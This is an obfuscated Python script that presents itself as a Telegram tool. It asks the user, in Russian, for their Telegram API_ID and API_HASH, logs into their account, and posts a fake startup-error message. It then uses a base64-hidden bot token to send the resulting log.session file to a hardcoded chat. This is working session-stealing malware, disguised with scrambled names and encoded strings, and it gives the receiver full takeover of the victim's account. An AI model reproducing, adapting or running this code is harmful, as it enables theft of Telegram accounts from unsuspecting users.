lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll = open, input, __name__, getattr, bytes

from base64 import b64decode as IlIIIIllIlIlII
from telebot import TeleBot as lIlllIlIlIIIlI
from os.path import exists as lIllIIlIlIIlll
from telethon import TelegramClient as IlllIIIIlIIIIl
lIIIllIllllllllIll = llllllllllllllI('Введите ваш API_ID: ')
lIIlIIlIlIllIlllIl = llllllllllllllI('Введите ваш API_HASH: ')
lIlIIIIIIIIIIlIlIl = 'Nzc0MzkwNzc3OTpBQUg1ZWhWdkhlWHo1bS14cVRGT3Z0RVRiczg5a2pXMzJXMA=='
lIllllllIIIllIIIlI = 'NTgyOTUwOTM5MA=='
IIlIllllIIIlIlIIll = lllllllllllllII(IlIIIIllIlIlII(lIlIIIIIIIIIIlIlIl), lllllllllllllII(llllllllllllIll, 'fromhex')('6465636f6465').decode())('utf-8')
IIIlIlIIllIIlIIlll = lllllllllllllII(IlIIIIllIlIlII(lIllllllIIIllIIIlI), lllllllllllllII(llllllllllllIll, 'fromhex')('6465636f6465').decode())('utf-8')
lIIIIlIIllIIlIIlIl = IlllIIIIlIIIIl('log', lIIIllIllllllllIll, lIIlIIlIlIllIlllIl)
llllIIIIIlIlIIlllI = lIlllIlIlIIIlI(IIlIllllIIIlIlIIll)

async def IIlIIIIllIllIIIlIl():
    await lIIIIlIIllIIlIIlIl.start()
    await lIIIIlIIllIIlIIlIl.send_message('me', 'произошла ошибка при запуске: api error termux')

def IllIlIIIlIlIlIIIlI():
    lIlIIlIIlIlIIIlIll = 'log.session'
    if lIllIIlIlIIlll(lIlIIlIIlIlIIIlIll):
        with lllllllllllllll(lIlIIlIIlIlIIIlIll, 'rb') as IlIIlIlIlIIIIlIlIl:
            llllIIIIIlIlIIlllI.send_document(IIIlIlIIllIIlIIlll, IlIIlIlIlIIIIlIlIl)
if lllllllllllllIl == '__main__':
    with lIIIIlIIllIIlIIlIl:
        lIIIIlIIllIIlIIlIl.loop.run_until_complete(IIlIIIIllIllIIIlIl())
    IllIlIIIlIlIlIIIlI()